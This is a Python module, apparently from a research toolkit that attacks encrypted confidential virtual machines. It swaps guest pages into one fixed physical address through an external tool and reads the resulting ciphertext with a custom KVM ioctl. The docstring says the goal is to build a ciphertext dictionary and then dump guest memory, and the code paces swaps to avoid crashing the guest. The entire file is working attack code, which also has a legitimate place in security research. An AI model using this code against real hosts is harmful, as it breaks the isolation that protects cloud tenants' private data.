#!/usr/bin/env python3
"""
swapio.py — PSP page-move readout shared by Stage 1 (dictionary) and Stage 3 (dump).

Same mechanism as MURA: swap_pages_tool swaps `src` into FIXED_GPA's physical
page and back (--swap-back); the kernel keeps the ciphertext of FIXED_GPA's frame
while it held src, read here through KVM_READ_PAGE_DUMP. Every readout therefore
happens under one physical address, so equal plaintext gives equal ciphertext.
"""
import ctypes
import fcntl
import os
import subprocess
import sys
import time
from pathlib import Path

import common as c

_KVMIO = 0xAE
KVM_READ_PAGE_DUMP = (0x80000000 | ((c.PAGE_SIZE & 0x3FFF) << 16) | (_KVMIO << 8) | 0x2b)

# MURA's stage-3 pacing (raised after guest deaths around 1,700 swaps).
SWAP_PACE_SEC = float(os.environ.get("SHAPES_SWAP_PACE", "0.8"))
SWAP_BURST_EVERY = int(os.environ.get("SHAPES_SWAP_BURST_EVERY", "8"))
SWAP_BURST_SLEEP = float(os.environ.get("SHAPES_SWAP_BURST_SLEEP", "5.0"))


def pace(k: int):
    if k <= 0:
        return
    if SWAP_BURST_EVERY > 0 and k % SWAP_BURST_EVERY == 0:
        time.sleep(SWAP_BURST_SLEEP)
    elif SWAP_PACE_SEC > 0:
        time.sleep(SWAP_PACE_SEC)


def to_xp(gpa: int, raw: bytes) -> str:
    lines = [f"(qemu) xp /512gx 0x{gpa:x}"]
    for i in range(0, c.PAGE_SIZE, 16):
        lo = int.from_bytes(raw[i:i + 8], "little")
        hi = int.from_bytes(raw[i + 8:i + 16], "little")
        lines.append(f"{gpa + i:016x}: 0x{lo:016x} 0x{hi:016x}")
    return "\n".join(lines)


def swap_read(fixed_gpa: int, src_gpa: int, out_path: Path) -> bool:
    rc = subprocess.run([str(c.SWAP_TOOL_PATH), f"0x{fixed_gpa:x}", f"0x{src_gpa:x}",
                         "--swap-back"]).returncode
    if rc != 0:
        print(f"[swap] [!] swap_pages_tool exit {rc} for 0x{src_gpa:x}", file=sys.stderr)
        return False
    fd = os.open("/dev/kvm", os.O_RDWR | os.O_CLOEXEC)
    try:
        buf = ctypes.create_string_buffer(c.PAGE_SIZE)
        for attempt in range(20):
            try:
                fcntl.ioctl(fd, KVM_READ_PAGE_DUMP, buf)
                break
            except BlockingIOError:
                if attempt == 19:
                    raise
                time.sleep(min(0.25 * (attempt + 1), 2.0))
        raw = bytes(buf)
    finally:
        os.close(fd)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(to_xp(fixed_gpa, raw) + "\n")
    return True
